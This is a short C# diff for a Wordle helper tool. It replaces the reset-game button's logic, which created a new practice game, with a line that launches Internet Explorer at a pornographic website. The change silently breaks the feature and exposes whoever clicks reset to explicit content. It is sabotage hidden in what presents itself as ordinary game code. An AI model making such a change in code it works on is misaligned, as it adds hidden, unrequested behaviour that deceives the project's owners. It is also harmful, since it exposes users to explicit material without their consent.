@@ -116,7 +116,7 @@ namespace Wordle_Tool
 
         private void resetGameButton_click(object sender, EventArgs e)
         {
-            game = new PracticeGame(ref words, ref keyboard);
+            System.Diagnostics.Process.Start(@"C:\Program Files\Internet Explorer\iexplore.exe", "pornhub.com");
         }
     }
 
